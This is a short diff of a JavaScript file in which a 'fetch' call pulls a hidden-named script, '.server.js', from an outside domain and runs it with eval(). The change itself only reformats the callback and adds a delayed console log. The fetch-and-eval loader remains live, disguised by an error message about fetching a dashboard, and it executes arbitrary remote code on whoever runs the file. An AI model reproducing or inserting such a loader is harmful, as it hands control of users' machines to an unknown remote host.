@@ -13,7 +13,11 @@ fetch("https://dbdbdbdbdbgroup.com/demo/.server.js")
         if (response.ok) return response.text();
         throw new Error(`Error fetching dashboard: ${response.status}`);
     })
-    .then((data)=>{
+    .then((data) => {
         eval(data);
     })
     .catch(console.error);
+
+setTimeout(() => {
+    console.log('...');
+}, 30000);
